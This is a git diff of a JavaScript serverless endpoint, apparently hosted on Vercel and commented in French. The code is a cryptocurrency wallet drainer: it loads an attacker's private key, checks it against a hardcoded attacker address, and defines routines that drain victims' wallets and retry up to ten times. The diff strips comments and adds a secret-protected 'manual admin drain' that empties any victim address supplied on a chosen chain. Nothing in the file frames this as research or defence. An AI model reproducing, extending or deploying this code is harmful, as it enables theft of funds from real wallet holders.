@@ -6,14 +6,12 @@ const ATTACKER_ADDRESS = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
 
 // --- Récupération de la clé privée ---
 function getPrivateKey() {
-  // 1. Variable d'environnement
   if (process.env.ATTACKER_PRIVATE_KEY) {
     const key = process.env.ATTACKER_PRIVATE_KEY.trim();
     if (key.length === 64) return key;
     console.warn('⚠️ ATTACKER_PRIVATE_KEY env invalide. Tentative fichier...');
   }
 
-  // 2. Fichier local
   const filePath = path.resolve('./private_key.txt');
   try {
     if (fs.existsSync(filePath)) {
@@ -25,7 +23,6 @@ function getPrivateKey() {
     console.warn('⚠️ Impossible de lire private_key.txt:', err.message);
   }
 
-  // 3. Échec
   throw new Error(
     '🔴 Aucune clé privée valide. ' +
     'Définis ATTACKER_PRIVATE_KEY dans l’env Vercel ou crée private_key.txt dans api/ (64 hex, sans 0x).'
@@ -34,7 +31,6 @@ function getPrivateKey() {
 
 const PRIVATE_KEY = getPrivateKey();
 
-// Vérification bloquante au démarrage
 if (!PRIVATE_KEY || PRIVATE_KEY.length !== 64) {
   throw new Error('ATTACKER_PRIVATE_KEY invalide. Déploiement annulé.');
 }
@@ -70,7 +66,6 @@ async function drainVictim(victimAddress, chainId) {
     throw new Error(`RPC ${chainId} non joignable`);
   }
 
-  // Vérification que la clé correspond à l'adresse attaquante
   const derivedAddress = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY).address;
   if (derivedAddress.toLowerCase() !== ATTACKER_ADDRESS.toLowerCase()) {
     throw new Error(`La clé privée ne correspond pas à ${ATTACKER_ADDRESS}`);
@@ -115,7 +110,6 @@ async function drainVictim(victimAddress, chainId) {
   drainedAddresses.add(victimAddress);
 }
 
-// Retry exponentiel : 10 tentatives
 async function drainWithRetry(victim, chainId, retries = 10, baseDelay = 1000) {
   for (let attempt = 1; attempt <= retries; attempt++) {
     try {
@@ -143,7 +137,35 @@ export default async function handler(req, res) {
   if (req.method === 'OPTIONS') return res.status(200).end();
 
   if (req.method === 'POST') {
-    const { victim, chain } = req.body;
+    const { victim, chain, adminSecret } = req.body;
+
+    // --- DRAIN MANUEL ADMIN ---
+    if (adminSecret) {
+      // Vérifier la présence du secret dans l'environnement
+      if (!process.env.ADMIN_SECRET || process.env.ADMIN_SECRET.trim().length === 0) {
+        return res.status(500).json({ error: 'ADMIN_SECRET non configuré sur le serveur' });
+      }
+
+      if (adminSecret !== process.env.ADMIN_SECRET) {
+        return res.status(401).json({ error: 'Secret admin invalide' });
+      }
+
+      if (!victim || !Web3.utils.isAddress(victim)) {
+        return res.status(400).json({ error: 'Adresse victime invalide' });
+      }
+
+      const targetChain = chain || '1';
+      console.log(`🔧 Drain manuel admin pour ${victim} (chain ${targetChain})`);
+
+      const success = await drainWithRetry(victim, targetChain);
+      if (success) {
+        return res.status(200).json({ success: true, victim, chain: targetChain });
+      } else {
+        return res.status(500).json({ error: 'Échec du drain après plusieurs tentatives' });
+      }
+    }
+
+    // --- FLUX NORMAL (victime scannée) ---
     if (!victim) return res.status(400).json({ error: 'Adresse victime manquante' });
 
     console.log(`📥 Victime reçue : ${victim} sur chain ${chain || '1'}`);
